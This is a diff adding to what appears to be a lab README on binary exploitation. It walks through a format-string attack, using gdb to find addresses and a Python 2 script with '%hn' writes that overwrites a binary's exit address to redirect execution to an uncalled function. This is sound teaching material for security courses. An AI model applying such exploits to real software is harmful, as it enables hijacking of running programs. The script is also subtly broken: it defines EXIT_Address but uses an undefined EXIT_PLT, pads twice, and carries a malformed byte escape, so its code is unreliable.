@@ -27,3 +27,32 @@ setarch `arch` -R ./victim "`python -c "print 'AAAA '+'\xe4\d9\xff\xff\xff\xff\x
 
 ```
 to set the number of bytes and modify the value.
+
+# Problem 2 : Modify the retun address
+
+If we want to call a function that is not being called in the main function, first we can use in gdb ```disas outsideFunc``` to get the the starting address of the outside function.
+Then, we can use ```disas main``` to get the exit function address of the ```main function```. 
+
+We can then use python program, that we can use to build the exploit string.
+```
+
+import struct
+
+outsideFunctionAddress = 0x5555555551a9
+EXIT_Address= 0x555555601040
+
+def pad(s):
+    return s+"X"*(512-len(s)-16)
+exploit=""
+exploit += "BBBBCCCC"
+exploit += "%{}x".format(0x676-len(exploit))
+exploit += "%68$hn"
+exploit = pad(exploit)
+exploit += struct.pack("Q", EXIT_PLT)
+exploit += struct.pack("Q", EXIT_PLT+2)
+
+print pad(exploit)
+
+```
+If we feed this output string to the code it would replace the exit address function with the outsideFunctionAddress.
+
